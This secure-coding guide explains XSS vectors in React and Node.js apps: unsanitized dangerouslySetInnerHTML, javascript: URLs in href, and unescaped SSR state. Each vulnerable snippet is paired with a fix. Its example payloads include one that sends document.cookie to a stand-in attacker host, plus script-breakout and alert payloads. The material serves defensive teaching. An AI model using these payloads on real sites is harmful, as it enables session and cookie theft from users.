In a React and Node.js stack, React provides strong default protections against Cross-Site Scripting (XSS) by automatically
escaping variables rendered within JSX. However, XSS vulnerabilities still frequently occur when developers explicitly bypass
React's contextual escaping or improperly handle user input in Node.js backend templates and dynamic links.

---

### Common XSS Vulnerability Vectors in React

#### 1. Insecure Use of `dangerouslySetInnerHTML`

When rendering raw HTML (e.g., from a rich-text editor or API response), developers use `dangerouslySetInnerHTML`. If
un-sanitized user input reaches this prop, malicious `<script>` tags or event handlers (like `onload` or `onerror`) execute
automatically.

```jsx
// VULNERABLE: Direct rendering of unsanitized HTML
function UserBio({ bioHtml }) {
  return <div dangerouslySetInnerHTML={{ __html: bioHtml }} />;
}
// Payload: <img src="x" onError="fetch('http://attacker.com/steal?c=' + document.cookie)" />
```

**Fix:** Always sanitize HTML inputs using **DOMPurify** prior to rendering.

```jsx
import DOMPurify from "dompurify";

// SECURE: Sanitizing input strips dangerous executable tags and attributes
function UserBio({ bioHtml }) {
  const cleanHtml = DOMPurify.sanitize(bioHtml);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

---

#### 2. JavaScript Pseudoprotocol Links (`javascript:`)

React escapes HTML tags in strings, but it does **not** validate URLs passed to `href` or `src` attributes.

```jsx
// VULNERABLE: Untrusted URL passed directly to href
function UserWebsite({ websiteUrl }) {
  return <a href={websiteUrl}>Visit Profile</a>;
}
// Payload: javascript:alert(document.cookie)
```

**Fix:** Validate and sanitize URLs on the server or client to enforce safe protocols (`http:` or `https:`).

```jsx
// SECURE: Validate URL protocol before rendering
function SafeLink({ url, children }) {
  const isSafe = url.startsWith("http://") || url.startsWith("https://");
  return (
    <a href={isSafe ? url : "#"} rel="noopener noreferrer">
      {children}
    </a>
  );
}
```

#### 3. Insecure Server-Side Rendering (SSR) State Hydration

When using frameworks like Next.js or custom Node.js SSR, initial state is often embedded directly into the HTML document as
a JSON string. If dynamically generated state isn't escaped, string termination breaks out into script execution.

```javascript
// VULNERABLE Node.js SSR setup:
const html = `
  <script>
    window.__INITIAL_STATE__ = ${JSON.stringify(initialState)};
  </script>
`;
// Payload inside initialState: </script><script>alert('XSS')</script>
```

**Fix:** Use an escaping utility like **serialize-javascript** instead of raw `JSON.stringify()`.

```javascript
const serialize = require("serialize-javascript");

// SECURE: Escapes HTML entities inside state objects
const html = `
  <script>
    window.__INITIAL_STATE__ = ${serialize(initialState, { isJSON: true })};
  </script>
`;
```

### Defense-in-Depth Layering

- **Content Security Policy (CSP):** Set a robust `Content-Security-Policy` HTTP header in Express using **Helmet** to block
  inline scripts and restrict script execution sources:

```javascript
const helmet = require("helmet");
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // Blocks inline scripts and unauthorized external scripts
    },
  })
);
```

- **HttpOnly Session Cookies:** Store session identifiers in `HttpOnly` and `SameSite=Strict` cookies so client-side
  JavaScript (`document.cookie`) cannot read them even if an XSS vulnerability exists.
